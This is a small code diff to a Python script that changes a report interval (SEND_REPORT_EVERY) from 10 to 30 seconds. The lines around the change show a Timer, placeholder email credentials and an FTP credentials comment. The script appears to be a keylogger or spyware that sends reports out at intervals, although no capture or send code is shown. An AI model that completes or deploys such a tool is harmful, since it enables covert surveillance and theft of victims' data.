@@ -6,7 +6,7 @@ import os
 from threading import Timer #Timer is used to make a method run after an interval of time
 from datetime import datetime
 
-SEND_REPORT_EVERY = 10
+SEND_REPORT_EVERY = 30 #in seconds
 EMAIL_ADDRESS = "email" #replace with your credentials
 EMAIL_PASSWORD = "pass"
 # FTP server credentials
